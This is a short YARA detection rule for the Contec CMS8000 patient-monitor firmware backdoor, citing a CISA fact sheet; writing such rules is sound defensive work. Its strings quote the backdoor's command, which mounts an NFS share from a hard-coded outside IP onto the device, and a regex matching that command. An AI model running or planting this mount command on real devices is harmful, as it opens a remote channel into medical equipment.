rule MAL_Contec_CMS8000_Backdoor_Feb25 {
    meta:
        description = "Detects Contec CMS8000 backdoor in firmware"
        reference = "https://www.cisa.gov/sites/default/files/2025-01/fact-sheet-contec-cms8000-contains-a-backdoor-508c.pdf"
        author = "Matt Green - @mgreen27"
        date = "2025-02-01"
    strings:
        //$with_ip =  "mount -o nolock -t nfs 202.114.4.119:/pm /mnt"
        $generic = /mount -o nolock -t nfs \d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\/pm \/mnt/
    condition:
        uint32( 0 ) == 0x464C457F
        and any of them
        and filesize < 4MB
}
